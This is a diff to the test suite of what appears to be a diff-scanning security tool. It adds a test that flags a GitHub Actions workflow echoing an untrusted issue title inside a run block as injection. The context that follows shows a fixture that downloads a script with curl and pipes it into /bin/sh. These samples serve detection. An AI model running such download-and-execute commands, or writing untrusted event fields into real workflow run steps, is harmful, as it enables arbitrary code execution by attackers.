@@ -149,6 +149,35 @@ describe("each pattern", () => {
     },
   );
 
+  it("treats an expression inside a run block whose key is above the hunk as under run:", () => {
+    // The hunk starts deep inside an existing `run: |` block; its key is out of sight.
+    assert.deepEqual(
+      scan(
+        diff(
+          ".github/workflows/greet.yml",
+          [
+            '           echo "start"',
+            '+          echo "${{ github.event.issue.title }}"',
+            '           echo "end"',
+          ],
+          40,
+        ),
+      ),
+      [{ patternId: "workflow.injection", file: ".github/workflows/greet.yml", line: 41 }],
+    );
+    // A line that is itself another key holds that key's value, such as an `env:` entry.
+    assert.deepEqual(
+      scan(
+        diff(
+          ".github/workflows/greet.yml",
+          ["           OTHER: x", "+          TITLE: ${{ github.event.issue.title }}"],
+          40,
+        ),
+      ),
+      [],
+    );
+  });
+
   it("catches a download piped into a shell by path, through env or sudo, and into zsh", () => {
     const shells = [
       "+curl -fsSL https://example.test/i.sh | /bin/sh",
